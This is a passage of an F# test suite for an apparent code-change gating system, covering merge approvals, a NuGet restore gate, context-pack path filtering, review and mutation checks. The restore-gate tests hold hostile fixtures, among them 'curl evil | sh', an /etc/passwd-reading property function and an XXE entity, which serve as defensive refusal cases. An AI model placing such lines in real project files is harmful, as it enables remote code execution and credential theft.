          equal 12.0 (Quality.crap (f 3 (Some 0.0))) "uncovered: c^2 + c"
          equal 3.0 (Quality.crap (f 3 (Some 1.0))) "fully covered: c"
          equal 12.0 (Quality.crap (f 3 None)) "no data is uncovered"
      "quality: a new function must meet every threshold; a function that was already over is only held to its baseline", fun () ->
          let t = { MaxCyclomatic = 10; MaxCrap = 30.0; MaxLines = 60 }
          let f name c = { File = "a.cs"; Name = name; Line = 1; Cyclomatic = c; Lines = 20; Coverage = Some 1.0 }
          let touched = [ { File = "a.cs"; First = 1; Last = 20 } ]
          equal [] (Quality.check t [] [ f "New" 10 ] touched |> List.map (fun v -> v.Measure)) "at the limit is fine"
          equal [] (Quality.check t [] [ { f "New" 9 with Coverage = None; Lines = 20 } ] touched) "no coverage data: CRAP is not judged"
          equal [ Cyclomatic ] (Quality.check t [] [ f "New" 11 ] touched |> List.map (fun v -> v.Measure)) "new code over the limit"
          equal [] (Quality.check t [ f "Old" 15 ] [ f "Old" 15 ] touched) "touched and no worse than before"
          equal [ Cyclomatic; Crap ] (Quality.check t [ f "Old" 15 ] [ f "Old" 16 ] touched |> List.map (fun v -> v.Measure)) "touched and worse (CRAP follows complexity)"
          equal [] (Quality.check t [ f "Old" 15 ] [ f "Old" 12 ] touched) "touched and better"
      "quality: untouched functions are not judged, and a function is identified by file and name, not line", fun () ->
          let t = { MaxCyclomatic = 10; MaxCrap = 30.0; MaxLines = 60 }
          let f line c = { File = "a.cs"; Name = "Old"; Line = line; Cyclomatic = c; Lines = 20; Coverage = Some 1.0 }
          equal [] (Quality.check t [ f 1 15 ] [ f 100 16 ] [ { File = "a.cs"; First = 1; Last = 5 } ]) "worse but untouched (moved down)"
          equal [] (Quality.check t [ f 1 15 ] [ f 100 15 ] [ { File = "a.cs"; First = 100; Last = 100 } ]) "moved but same: same function"
          equal [ Cyclomatic; Crap ] (Quality.check t [ f 1 15 ] [ f 100 16 ] [ { File = "a.cs"; First = 110; Last = 110 } ] |> List.map (fun v -> v.Measure)) "touched inside the moved body"
          equal [] (Quality.check t [] [ f 100 99 ] [ { File = "b.cs"; First = 100; Last = 100 } ]) "other file touched"

      // ---------- fitness ----------
      "fitness: a code edge between two elements must be a modelled relationship, in that direction", fun () ->
          let el id area = { Id = ElementId id; Name = id; CodeAreas = [ PathPattern.createOrFail area ]; Risk = Low; InScope = true }
          let elements = [ el "api" "src/Api/**"; el "rating" "src/Rating/**"; el "db" "src/Db/**" ]
          let rels = [ { From = ElementId "api"; To = ElementId "rating" } ]
          let edge a b = { Source = a; Target = b }
          let vs es = Fitness.violations elements rels es |> List.map (fun v -> v.FromElement.Value, v.ToElement.Value)
          equal [] (vs [ edge "src/Api/Api.csproj" "src/Rating/Rating.csproj" ]) "modelled"
          equal [ "rating", "api" ] (vs [ edge "src/Rating/Rating.csproj" "src/Api/Api.csproj" ]) "the model says api -> rating, not back"
          equal [ "api", "db" ] (vs [ edge "src/Api/Api.csproj" "src/Db/Db.csproj" ]) "no relationship"
          equal [] (vs [ edge "src/Api/Api.csproj" "src/Api/Api.Tests.csproj" ]) "inside one element"
          equal [] (vs [ edge "src/Api/Api.csproj" "src/Shared/Shared.csproj" ]) "unowned code is not judged"
      "fitness: only element pairs the baseline did not already cross are new", fun () ->
          let v a b = { Edge = { Source = "x"; Target = "y" }; FromElement = ElementId a; ToElement = ElementId b }
          let isNew = Fitness.newSince [ v "api" "db" ] [ v "api" "db"; v "rating" "db" ] |> List.map (fun x -> x.FromElement.Value)
          equal [ "rating" ] isNew "api->db is debt, rating->db is new"
      "fitness: debt is each element pair the baseline crossed that the code still crosses, once", fun () ->
          let v a b src = { Edge = { Source = src; Target = "y" }; FromElement = ElementId a; ToElement = ElementId b }
          let pairs = Fitness.debt [ v "api" "db" "a"; v "web" "db" "w" ] [ v "api" "db" "a"; v "api" "db" "b"; v "rating" "db" "r" ]
          equal [ ElementId "api", ElementId "db" ] pairs "web->db was removed, rating->db is new, api->db once"

      "fitness: a hand-written rule forbids edges by path and only new crossings are the task's", fun () ->
          let rule = { From = PathPattern.createOrFail "src/Domain/**"; To = PathPattern.createOrFail "src/Infra/**"; Why = "domain must not know infrastructure" }
          let edge a b = { Source = a; Target = b }
          let hit = edge "src/Domain/D.csproj" "src/Infra/I.csproj"
          let vs = Fitness.forbidden [ rule ]
          equal [ hit ] (vs [ hit ] |> List.map (fun v -> v.Edge)) "matches both ends"
          equal [] (vs [ edge "src/Infra/I.csproj" "src/Domain/D.csproj" ]) "direction matters"
          equal [] (vs [ edge "src/Domain/D.csproj" "src/Shared/S.csproj" ]) "other target"
          equal [] (Fitness.newRuleViolationsSince (vs [ hit ]) (vs [ hit ])) "already crossed on the baseline is debt"
          equal 1 (Fitness.newRuleViolationsSince [] (vs [ hit ]) |> List.length) "new"

      // ---------- merge ----------
      "merge: high-risk element needs two approvals and a manual check is a pending block", fun () ->
          let d = Dispatcher.dispatch validated.Value
          let v =
              Merge.decide Merge.defaultPolicy
                  { Teams = d.Waves |> List.collect (fun w -> w.Teams); Handover = handover; ChangedLines = 120
                    ChangedFiles = [ "src/Quotes.Data/Quote.cs" ] }
          equal TwoApprovals v.Tier "tier"
          check (v.Blocks |> List.exists (function ManualVerifyPending _ -> true | _ -> false)) $"%A{v.Blocks}"
      "merge: a file outside every team's writes is a scope leak block", fun () ->
          let team = { Id = TeamId "t"; Tasks = [ task "T-002" ]; Writes = [ p "src/PricingApi/**" ]; Elements = [] }
          let v = Merge.decide Merge.defaultPolicy { Teams = [ team ]; Handover = handover; ChangedLines = 5; ChangedFiles = [ "Directory.Build.props" ] }
          equal [ ScopeLeak "Directory.Build.props" ] v.Blocks "blocks"
      "merge: a change under a protected path is its own block", fun () ->
          let team = { Id = TeamId "t"; Tasks = [ task "T-002" ]; Writes = [ p "src/PricingApi/**" ]; Elements = [] }
          let h = { handover with ProtectedPaths = [ p ".github/**" ] }
          let v = Merge.decide Merge.defaultPolicy { Teams = [ team ]; Handover = h; ChangedLines = 5; ChangedFiles = [ ".github/workflows/ci.yml" ] }
          equal [ ProtectedPathChanged ".github/workflows/ci.yml" ] v.Blocks "blocks"
      "merge: small low-risk change auto-merges", fun () ->
          let h = { handover with Elements = handover.Elements |> List.map (fun e -> { e with Risk = Low }) }
          let team = { Id = TeamId "t"; Tasks = [ task "T-002" ]; Writes = [ p "src/PricingApi/**" ]; Elements = [ ElementId "Pricing Platform/Pricing API" ] }
          let v = Merge.decide Merge.defaultPolicy { Teams = [ team ]; Handover = h; ChangedLines = 40; ChangedFiles = [ "src/PricingApi/Q.cs" ] }
          equal AutoMerge v.Tier "tier"
          equal [] v.Blocks "no blocks"
      "merge: every block stops the merge in both modes", fun () ->
          for block in [ ScopeLeak "x"; ProtectedPathChanged ".github/x"; ManualVerifyPending "T-001: eyeball" ] do
              for mode in [ Auto; Tiered [ "alice" ] ] do
                  let v = { Tier = AutoMerge; Reasons = []; Blocks = [ block ] }
                  equal (MergeAction.Blocked [ block ]) (Merge.action { Merge.defaultPolicy with Enforcement = mode } v) $"{block} {mode}"
      "merge: auto mode merges on green whatever the tier", fun () ->
          let v = { Tier = TwoApprovals; Reasons = [ "high risk" ]; Blocks = [] }
          equal MergeAction.MergeNow (Merge.action { Merge.defaultPolicy with Enforcement = Auto } v) "auto"
      "merge: tiered mode merges at AutoMerge and waits for approvers above it", fun () ->
          let tiered = { Merge.defaultPolicy with Enforcement = Tiered [ "alice" ] }
          equal MergeAction.MergeNow (Merge.action tiered { Tier = AutoMerge; Reasons = []; Blocks = [] }) "auto tier"
          equal (MergeAction.AwaitApproval(OneApproval, [ "alice" ])) (Merge.action tiered { Tier = OneApproval; Reasons = []; Blocks = [] }) "one"

      "approve: distinct allow-listed logins count; others and plain comments do not", fun () ->
          let c a b = { Author = a; Body = b }
          let comments = [ c "alice" "/approve looks right"; c "mallory" "/approve"; c "bob" "nice"; c "ALICE" "/approve again" ]
          let a = Merge.approvals TwoApprovals [ "alice"; "bob" ] comments
          equal false a.Approved "one distinct approver"
          equal [ "alice" ] a.By "by"
          equal 1 a.Missing "missing"
          let b = Merge.approvals TwoApprovals [ "alice"; "bob" ] (comments @ [ c "bob" "/approve ok" ])
          equal true b.Approved "two"
          equal false b.SingleOperator "not single"
      "approve: a single operator approves twice with two stated reasons, flagged", fun () ->
          let c b = { Author = "mike"; Body = b }
          let once = Merge.approvals TwoApprovals [ "mike" ] [ c "/approve schema reviewed"; c "/approve schema reviewed" ]
          equal false once.Approved "same reason twice is one approval"
          let noReason = Merge.approvals TwoApprovals [ "mike" ] [ c "/approve"; c "/approve" ]
          equal false noReason.Approved "reasons are required"
          let twice = Merge.approvals TwoApprovals [ "mike" ] [ c "/approve schema reviewed"; c "/approve migration dry-run ok" ]
          equal true twice.Approved "approved"
          equal true twice.SingleOperator "flagged"
          equal false (Merge.approvals OneApproval [ "mike" ] [ c "/approve" ]).SingleOperator "one approval is not an override"
      "approve: an allow-listed /verified comment clears that manual check's block", fun () ->
          let v = { Tier = OneApproval; Reasons = []; Blocks = [ ManualVerifyPending "T-001: eyeball"; ScopeLeak "x" ] }
          let comments = [ { Author = "eve"; Body = "/verified T-001: eyeball" } ]
          equal v.Blocks (Merge.recordVerified [ "mike" ] comments v).Blocks "not allow-listed"
          let ok = Merge.recordVerified [ "mike" ] [ { Author = "mike"; Body = "/verified T-001: eyeball" } ] v
          equal [ ScopeLeak "x" ] ok.Blocks "manual cleared, scope leak stays"

      // ---------- regression ----------
      "regression: a test that passed before and fails now is a regression", fun () ->
          let r name passed = { Name = name; Passed = passed }
          equal [ "b" ] (Regression.regressions [ r "a" true; r "b" true ] [ r "a" true; r "b" false ]) "p2p"
      "regression: tests that failed before, or are new, are not regressions", fun () ->
          let r name passed = { Name = name; Passed = passed }
          equal [] (Regression.regressions [ r "a" false ] [ r "a" false; r "new" false ]) "f2f and new"
      "regression: a passing test missing now counts (deleted, or the suite did not build)", fun () ->
          let r name passed = { Name = name; Passed = passed }
          equal [ "a"; "b" ] (Regression.regressions [ r "a" true; r "b" true ] []) "missing"
      "regression: a duplicated name passes only if every run of it passes", fun () ->
          let r name passed = { Name = name; Passed = passed }
          equal [] (Regression.regressions [ r "a" true; r "a" false ] [ r "a" false ]) "flaky in baseline is not p2p"
          equal [ "a" ] (Regression.regressions [ r "a" true ] [ r "a" true; r "a" false ]) "one failing run now"

      // ---------- handover closure ----------
      "closure: delivered only when merged and every check of every bound decision passed", fun () ->
          let d1 = { Id = DecisionId "D-0001"; Statement = "s"; Binds = []; Checks = [ { Kind = "p"; Run = "p check -tc a" }; { Kind = "p"; Run = "p check -tc b" } ] }
          let d2 = { Id = DecisionId "D-0002"; Statement = "s"; Binds = []; Checks = [ { Kind = "p"; Run = "p check -tc c" } ] }
          let r d run passed = { Decision = DecisionId d; Check = run; Passed = passed }
          let all = [ r "D-0001" "p check -tc a" true; r "D-0001" "p check -tc b" true; r "D-0002" "p check -tc c" true ]
          equal HandoverOutcome.Delivered (HandoverClosure.outcome [ d1; d2 ] true all) "all pass"
          equal HandoverOutcome.Abandoned (HandoverClosure.outcome [ d1; d2 ] false all) "not merged"
          equal HandoverOutcome.Abandoned (HandoverClosure.outcome [ d1; d2 ] true (List.take 2 all)) "a check never ran"
          equal HandoverOutcome.Abandoned (HandoverClosure.outcome [ d1; d2 ] true (all @ [ r "D-0002" "p check -tc c" false ])) "latest run failed"
          equal HandoverOutcome.Delivered (HandoverClosure.outcome [ d1; d2 ] true (r "D-0001" "p check -tc a" false :: all)) "failed then passed"
      "closure: a decision with no checks does not block delivery", fun () ->
          let d = { Id = DecisionId "D-0001"; Statement = "s"; Binds = []; Checks = [] }
          equal HandoverOutcome.Delivered (HandoverClosure.outcome [ d ] true []) "no checks"

      // ---------- regeneration ----------
      "regeneration: an unchanged handover re-runs nothing", fun () ->
          let r = Regeneration.between handover handover plan
          equal [] r.Changed "changed"
          equal [] r.Rerun "rerun"
      "regeneration: a changed decision re-runs only the tasks on the elements it binds", fun () ->
          let after =
              { handover with
                  Decisions = handover.Decisions |> List.map (fun d -> { d with Statement = d.Statement + " Retry once on conflict." }) }
          let r = Regeneration.between handover after plan
          equal [ DecisionId "D-0042" ] r.Changed "changed"
          equal [ TaskId "T-001"; TaskId "T-004" ] r.Rerun "rerun (Quotes DB tasks; T-002/T-003 depend on T-001 but are not bound)"
      "regeneration: a rebound decision re-runs tasks on the old and the new elements", fun () ->
          let after =
              { handover with
                  Decisions = handover.Decisions |> List.map (fun d -> { d with Binds = [ ElementId "Pricing Platform/Referral Worker" ] }) }
          equal [ TaskId "T-001"; TaskId "T-003"; TaskId "T-004" ] (Regeneration.between handover after plan).Rerun "rerun"
      "regeneration: an added or removed decision counts as changed", fun () ->
          let added =
              { Id = DecisionId "D-0043"; Statement = "Quotes are priced in the cedant's currency."
                Binds = [ ElementId "Pricing Platform/Pricing API" ]; Checks = [] }
          let after = { handover with Decisions = handover.Decisions @ [ added ] }
          let r = Regeneration.between handover after plan
          equal [ DecisionId "D-0043" ] r.Changed "added"
          equal [ TaskId "T-002" ] r.Rerun "rerun"
          equal [ DecisionId "D-0043" ] (Regeneration.between after handover plan).Changed "removed"

      // ---------- restore gate ----------
      "restore gate: package and project references are fine, new file or edit", fun () ->
          let before = """<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net9.0</TargetFramework></PropertyGroup></Project>"""
          let after = """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup><TargetFramework>net9.0</TargetFramework><IsPackable>false</IsPackable><Nullable>enable</Nullable></PropertyGroup>
  <ItemGroup>
    <PackageReference Include="xunit" Version="2.9.2" />
    <PackageReference Include="coverlet.collector" Version="6.0.2"><PrivateAssets>all</PrivateAssets><IncludeAssets>runtime; build</IncludeAssets></PackageReference>
    <ProjectReference Include="..\..\src\Pricing.Api\Pricing.Api.csproj" />
  </ItemGroup>
</Project>"""
          equal (Ok ()) (ProjectFileChange.check (Some before) after) "edit"
          equal (Ok ()) (ProjectFileChange.check None after) "new file"
          let fsproj = """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><Compile Include="Domain.fs" /></ItemGroup></Project>"""
          equal (Ok ()) (ProjectFileChange.check None fsproj) "F# compile order"
      "restore gate: anything that runs or redirects during a restore is refused", fun () ->
          let refused after (needle: string) =
              match ProjectFileChange.check None after with
              | Error es -> check (es |> List.exists (fun e -> e.Contains needle)) $"%A{es}"
              | Ok () -> check false $"accepted: {after}"
          refused """<Project Sdk="Microsoft.NET.Sdk"><Target Name="X" BeforeTargets="Restore"><Exec Command="curl x" /></Target></Project>""" "Target"
          refused """<Project Sdk="Microsoft.NET.Sdk"><Import Project="evil.targets" /></Project>""" "Import"
          refused """<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><RestoreSources>https://evil/v3/index.json</RestoreSources></PropertyGroup></Project>""" "RestoreSources"
          refused """<Project Sdk="Contoso.Sdk/1.0.0"></Project>""" "Contoso.Sdk/1.0.0"
          refused """<Project Sdk="Microsoft.NET.Sdk" InitialTargets="X"></Project>""" "InitialTargets"
          refused """<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><RootNamespace>$([System.IO.File]::ReadAllText('/etc/passwd'))</RootNamespace></PropertyGroup></Project>""" "property function"
          refused """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><PackageReference Include="x" Version="$([System.Environment]::GetEnvironmentVariable('HOME'))" /></ItemGroup></Project>""" "property function"
          refused """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup>""" "XML"
          refused """<!DOCTYPE p [<!ENTITY e SYSTEM "file:///etc/passwd">]><Project Sdk="Microsoft.NET.Sdk"></Project>""" "XML"
      "restore gate: what the repo already had is trusted; only the change is checked", fun () ->
          let before = """<Project Sdk="Microsoft.NET.Sdk"><Target Name="Gen" BeforeTargets="Build"><Exec Command="./gen.sh" /></Target></Project>"""
          let after = """<Project Sdk="Microsoft.NET.Sdk"><Target Name="Gen" BeforeTargets="Build"><Exec Command="./gen.sh" /></Target><ItemGroup><PackageReference Include="xunit" Version="2.9.2" /></ItemGroup></Project>"""
          equal (Ok ()) (ProjectFileChange.check (Some before) after) "untouched target"
          let edited = before.Replace("./gen.sh", "curl evil | sh")
          check (Result.isError (ProjectFileChange.check (Some before) edited)) "an edited target is a new one"
      "restore gate: review picks the rule by file", fun () ->
          let csproj = """<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><PackageReference Include="xunit" Version="2.9.2" /></ItemGroup></Project>"""
          equal (Ok ()) (ProjectFileChange.review "tests/A.Tests/A.Tests.csproj" None (Some csproj)) "project file"
          equal (Ok ()) (ProjectFileChange.review "src/X.cs" None (Some "class X {}")) "not a restore input"
          equal (Ok ()) (ProjectFileChange.review "tests/A.Tests/A.Tests.csproj" (Some csproj) None) "deleted"
          let cpm = """<Project><PropertyGroup><ManagePackageVersionsCentrally>true</ManagePackageVersionsCentrally></PropertyGroup><ItemGroup><PackageVersion Include="xunit" Version="2.9.2" /></ItemGroup></Project>"""
          equal (Ok ()) (ProjectFileChange.review "Directory.Packages.props" None (Some cpm)) "central package versions"
          for path in [ "nuget.config"; "src/NuGet.Config"; "Directory.Build.props"; "src/Directory.Build.targets"; "build/x.props"; "x.targets"; "global.json" ] do
              check (Result.isError (ProjectFileChange.review path None (Some "<Project />"))) path
          check (ProjectFileChange.affectsRestore "src/A/A.fsproj" && ProjectFileChange.affectsRestore "NuGet.config"
                 && not (ProjectFileChange.affectsRestore "src/A/A.cs")) "affectsRestore"
          // P models (.pproj) are compiled by `p compile`, not restored.
          check (not (ProjectFileChange.affectsRestore "P/Probe.pproj") && not (ProjectFileChange.isProject "Probe.pproj")) "a P project is not restored"
      // ---------- context pack ----------
      "context pack defaults: project file, one convention test, existing in-scope files", fun () ->
          let repo = [ "src/Pricing.Data/Pricing.Data.csproj"; "src/Pricing.Data/Quote.cs"; "src/Pricing.Data/QuotesDbContext.cs"
                       "tests/Pricing.Data.Tests/Pricing.Data.Tests.csproj"; "tests/Pricing.Data.Tests/QuoteTests.cs"; "tests/Pricing.Data.Tests/OtherTests.cs"
                       "src/Pricing.Api/Program.cs" ]
          let got = ContextPack.defaults repo [ p "src/Pricing.Data/**" ] [ p "tests/Pricing.Data.Tests/**" ]
          check (List.contains "src/Pricing.Data/Pricing.Data.csproj" got) "project file of the write root"
          check (List.contains "src/Pricing.Data/Quote.cs" got && List.contains "src/Pricing.Data/QuotesDbContext.cs" got) "files under writes"
          check (List.contains "tests/Pricing.Data.Tests/Pricing.Data.Tests.csproj" got) "test project file"
          equal 1 (got |> List.filter (fun f -> f.EndsWith "Tests.cs") |> List.length) "exactly one convention test file"
          check (not (List.contains "src/Pricing.Api/Program.cs" got)) "nothing outside the task's roots"
          equal got (List.distinct got) "no duplicates"
      "context pack select: defaults first, valid nominations kept with their reason", fun () ->
          let exists f = f <> "src/Missing.cs"
          let s = ContextPack.select ContextPack.defaultLimits exists [ "src/A.cs" ] [ { Path = "src/B.cs"; Reason = "calls A" } ]
          equal [ { Path = "src/A.cs"; Source = Default }; { Path = "src/B.cs"; Source = Nominated "calls A" } ] s.Entries "entries"
          equal [] s.Rejected "nothing rejected"
      "context pack select: bad nominations are rejected with a reason, never fatal", fun () ->
          let exists f = f <> "src/Missing.cs"
          let noms =
              [ { Path = "src/Missing.cs"; Reason = "r" }
                { Path = "../secret.txt"; Reason = "r" }
                { Path = "/etc/passwd"; Reason = "r" }
                { Path = ".git/config"; Reason = "r" }
                { Path = ".factory/policy.yaml"; Reason = "r" }
                { Path = "src/NoReason.cs"; Reason = "  " }
                { Path = "src/A.cs"; Reason = "already a default" }
                { Path = "src/Ok.cs"; Reason = "fine" }
                { Path = "src/Ok.cs"; Reason = "again" } ]
          let s = ContextPack.select ContextPack.defaultLimits exists [ "src/A.cs" ] noms
          equal [ "src/A.cs"; "src/Ok.cs" ] (s.Entries |> List.map (fun e -> e.Path)) "kept"
          equal 8 s.Rejected.Length "every bad nomination is reported once"
          check (s.Rejected |> List.forall (fun (_, why) -> why <> "")) "each rejection has a reason"
      "context pack select: at most MaxNominations, the rest rejected in order", fun () ->
          let limits = { ContextPack.defaultLimits with MaxNominations = 2 }
          let noms = [ for i in 1..4 -> { Path = $"src/F{i}.cs"; Reason = "r" } ]
          let s = ContextPack.select limits (fun _ -> true) [] noms
          equal [ "src/F1.cs"; "src/F2.cs" ] (s.Entries |> List.map (fun e -> e.Path)) "first two kept"
          equal [ "src/F3.cs"; "src/F4.cs" ] (s.Rejected |> List.map fst) "rest rejected"
      "context pack withWritten: written files join the pack, the selection does not grow", fun () ->
          let sel = { Entries = [ { Path = "src/A.cs"; Source = Default }; { Path = "src/B.cs"; Source = Nominated "r" } ]; Rejected = [] }
          let got = ContextPack.withWritten sel [ "tests/T.cs"; "src/B.cs"; "tests/T.cs" ]
          equal [ "src/A.cs"; "src/B.cs"; "tests/T.cs" ] (got |> List.map (fun e -> e.Path)) "no duplicates, nothing else added"
          equal TaskWritten (got |> List.find (fun e -> e.Path = "src/B.cs")).Source "a written nomination is task-written"
          equal 2 sel.Entries.Length "selection untouched"
      "context pack fit: within budget nothing is cut; task-written files come first", fun () ->
          let e path src = { Path = path; Source = src }
          let got = ContextPack.fit ContextPack.defaultLimits [ e "n.cs" (Nominated "r"), "nn"; e "d.cs" Default, "dd"; e "w.cs" TaskWritten, "ww" ]
          equal [ "w.cs"; "d.cs"; "n.cs" ] (got |> List.map (fun f -> f.Path)) "order"
          check (got |> List.forall (fun f -> not f.Truncated)) "none truncated"
      "context pack fit: over budget cuts the crossing file and drops the rest, task-written whole", fun () ->
          let e path src = { Path = path; Source = src }
          let limits = { ContextPack.defaultLimits with MaxChars = 500 }
          let big = String.replicate 400 "x"
          let got = ContextPack.fit limits [ e "n.cs" (Nominated "r"), big; e "d.cs" Default, big; e "w.cs" TaskWritten, big ]
          equal [ "w.cs"; "d.cs" ] (got |> List.map (fun f -> f.Path)) "nomination dropped"
          check (not got.[0].Truncated && got.[0].Text = big) "task-written kept whole"
          check got.[1].Truncated "default cut"
          check ((got |> List.sumBy (fun f -> f.Text.Length)) <= 500) "never over budget"
      "context pack fit: a task-written file larger than the budget is cut, never dropped", fun () ->
          let limits = { ContextPack.defaultLimits with MaxChars = 300 }
          let got = ContextPack.fit limits [ { Path = "w.cs"; Source = TaskWritten }, String.replicate 1000 "x" ]
          equal 1 got.Length "kept"
          check (got.[0].Truncated && got.[0].Text.Length <= 300) "cut to budget"
      // ---------- review ----------
      "review diff: the new-side lines of each hunk are visible, added ones marked", fun () ->
          let diff =
              String.concat "\n"
                  [ "diff --git a/src/Q.cs b/src/Q.cs"
                    "--- a/src/Q.cs"
                    "+++ b/src/Q.cs"
                    "@@ -3,3 +3,4 @@ class Q"
                    " keep"
                    "-old"
                    "+new1"
                    "+new2"
                    " tail"
                    "diff --git a/src/Gone.cs b/src/Gone.cs"
                    "--- a/src/Gone.cs"
                    "+++ /dev/null"
                    "@@ -1,2 +0,0 @@"
                    "-x"
                    "-y" ]
          let d = Diff.parse diff
          equal (Set.ofList [ 3; 4; 5; 6 ]) (d.Visible.["src/Q.cs"]) "context and added lines, new-side numbering"
          equal (Set.ofList [ 4; 5 ]) (d.Added.["src/Q.cs"]) "added lines"
          check (not (d.Visible.ContainsKey "src/Gone.cs")) "a deleted file has no new-side lines"
      "review validate: findings must cite a file:line inside the diff; the rest are dropped with a reason", fun () ->
          let f cat file line = { Category = cat; File = file; Line = line; Message = "m" }
          let inside = f Intent "src/Q.cs" 4
          let outside = f Security "src/Q.cs" 99
          let elsewhere = f Intent "src/Other.cs" 1
          let kept, dropped =
              Review.validate (fun file line -> file = "src/Q.cs" && line < 10) [ inside; outside; elsewhere ]
          equal [ inside ] kept "kept"
          equal 2 dropped.Length "dropped"
          check (dropped |> List.forall (fun (_, why) -> why.Contains "not in the diff")) "reason says why"
      "review: design findings are advisory, every other category blocks", fun () ->
          let f cat = { Category = cat; File = "a"; Line = 1; Message = "m" }
          let blocking, advisory =
              Review.split [ f TestGaming; f Intent; f BoundDecision; f Security; f WeakTests; f Design ]
          equal 5 blocking.Length "five block"
          equal [ f Design ] advisory "design is advisory"
      "review route: weak tests go back to the test author, anything else to the implementer", fun () ->
          let f cat = { Category = cat; File = "a"; Line = 1; Message = "m" }
          equal ToImplementer (Review.route [ f Security; f Intent ]) "implementation findings"
          equal ToTestAuthor (Review.route [ f WeakTests ]) "weak tests"
          equal ToTestAuthor (Review.route [ f Security; f WeakTests ]) "the tests change first when both"
      "review re-review: new findings only on lines the fix changed, open findings anywhere visible", fun () ->
          let f cat file line = { Category = cat; File = file; Line = line; Message = "m" }
          let open1 = f Security "src/Q.cs" 7
          let changed file line = file = "src/Q.cs" && line = 4
          let allowed = Review.reReviewAllows [ open1 ] changed
          check (allowed (f Intent "src/Q.cs" 4)) "a new finding on a changed line"
          check (not (allowed (f Intent "src/Q.cs" 8))) "a new finding on an untouched line is out of scope"
          check (allowed (f Security "src/Q.cs" 8)) "the same category in the same file is still the open finding"
      // ---------- json ----------
      "json: malformed plan reports every problem at once", fun () ->
          let bad = """{ "handover": {"id":"x","digest":"y"}, "tasks": [ {"id":"A"}, {"id":"B","title":"t","instructions":"i","writes":["../x"]} ] }"""
          match Json.parsePlan bad with
          | Ok _ -> failwith "should fail"
          | Error es -> check (es.Length >= 2) $"%A{es}"
      "json: handover round-trips through writeHandover", fun () ->
          match Json.parseHandover (Json.writeHandover handover) with
          | Ok h -> equal handover h "round trip"
          | Error es -> failwithf "%A" es
      "json: relationships round-trip, and a handover frozen before they existed has none", fun () ->
          let rel = { From = ElementId "Pricing Platform/Pricing API"; To = ElementId "Pricing Platform/Rating Engine" }
          match Json.parseHandover (Json.writeHandover { handover with Relationships = [ rel ] }) with
          | Ok h -> equal [ rel ] h.Relationships "round trip"
          | Error es -> failwithf "%A" es
          equal [] handover.Relationships "the example predates relationships"
      "mutation: score counts killed and timed-out mutants, ignoring compile errors and ignored ones", fun () ->
          let m id st = { Id = id; File = "A.cs"; Line = 1; Mutator = "Arithmetic"; Status = st }
          equal (Some 0.5) (Mutation.score [ m "1" Killed; m "2" Survived; m "3" CompileError; m "4" Ignored ]) "score"
          equal (Some 1.0) (Mutation.score [ m "1" Timeout ]) "timeout is detected"
          equal (Some 0.0) (Mutation.score [ m "1" NoCoverage ]) "no coverage is undetected"
          equal None (Mutation.score [ m "1" CompileError ]) "nothing to judge"
      "mutation: only mutants on changed lines are judged, each file against the threshold", fun () ->
          let m id file line st = { Id = id; File = file; Line = line; Mutator = "x"; Status = st }
          let ranges = [ { File = "A.cs"; First = 10; Last = 20 } ]
          let ms = [ m "1" "A.cs" 12 Killed; m "2" "A.cs" 15 Survived; m "3" "A.cs" 99 Survived; m "4" "B.cs" 12 Survived ]
          match Mutation.check { MinScore = 0.8 } Map.empty Set.empty ranges ms with
          | [ v ] ->
              equal "A.cs" v.File "file"
              equal [ "2" ] (v.Survivors |> List.map (fun x -> x.Id)) "survivors"
              equal 0.8 v.Required "required"
          | other -> failwithf "%A" other
          equal [] (Mutation.check { MinScore = 0.5 } Map.empty Set.empty ranges ms) "50% passes a 50% gate"
      "mutation: a file already below the gate need only not get worse", fun () ->
          let m id st = { Id = id; File = "A.cs"; Line = 12; Mutator = "x"; Status = st }
          let ranges = [ { File = "A.cs"; First = 10; Last = 20 } ]
          let ms = [ m "1" Killed; m "2" Survived ]
          equal [] (Mutation.check { MinScore = 0.8 } (Map.ofList [ "A.cs", 0.4 ]) Set.empty ranges ms) "0.5 >= baseline 0.4"
          check (not (List.isEmpty (Mutation.check { MinScore = 0.8 } (Map.ofList [ "A.cs", 0.6 ]) Set.empty ranges ms))) "0.5 < baseline 0.6"
      "mutation: an equivalent mutant counts only when the reviewer confirmed it", fun () ->
          let m id st = { Id = id; File = "A.cs"; Line = 12; Mutator = "x"; Status = st }
          let ranges = [ { File = "A.cs"; First = 10; Last = 20 } ]
          let ms = [ m "1" Killed; m "2" Survived ]
          equal [] (Mutation.check { MinScore = 1.0 } Map.empty (Mutation.confirmedEquivalents (set [ "2" ]) (set [ "2" ])) ranges ms) "confirmed"
          check (not (List.isEmpty (Mutation.check { MinScore = 1.0 } Map.empty (Mutation.confirmedEquivalents (set [ "2" ]) Set.empty) ranges ms))) "declared only"
      "red evidence: tests that already pass are red evidence only if they kill a mutant", fun () ->
          check (Result.isError (RedEvidence.CreateAgainstMutant([ outcome "a" 0 ], 0))) "no kill"
          check (Result.isError (RedEvidence.CreateAgainstMutant([], 1))) "no outcomes"
          match RedEvidence.CreateAgainstMutant([ outcome "a" 0 ], 2) with
          | Ok r -> equal AgainstMutant r.Kind "kind"
          | Error e -> failwith e
      "json: against_mutant red evidence round-trips", fun () ->
          let r = match RedEvidence.CreateAgainstMutant([ outcome "a" 0 ], 1) with Ok r -> r | Error e -> failwith e
          match Json.decodeTaskEvent (Json.encodeTaskEvent (TestsAuthored r)) with
          | Ok(TestsAuthored r2) -> equal AgainstMutant r2.Kind "kind"
          | other -> failwithf "%A" other
      "ui: a baseline test id that is gone is Removed", fun () ->
          let tid = { Kind = TestId; Id = "export-btn" }
          equal [ Removed tid ] (UiGuard.check [] [] [ tid ] []) "removed"
          equal [] (UiGuard.check [] [] [ tid ] [ tid ]) "kept"
      "ui: an authorised removal is clean", fun () ->
          let tid = { Kind = TestId; Id = "export-btn" }
          equal [] (UiGuard.check [] [ tid ] [ tid ] []) "authorised"
      "ui: a contract item that is missing is ContractMissing even if the baseline never had it", fun () ->
          let r = { Kind = Route; Id = "/reports" }
          equal [ ContractMissing r ] (UiGuard.check [ r ] [] [] []) "contract"
          equal [ ContractMissing r ] (UiGuard.check [ r ] [] [ r ] []) "contract, not also removed"
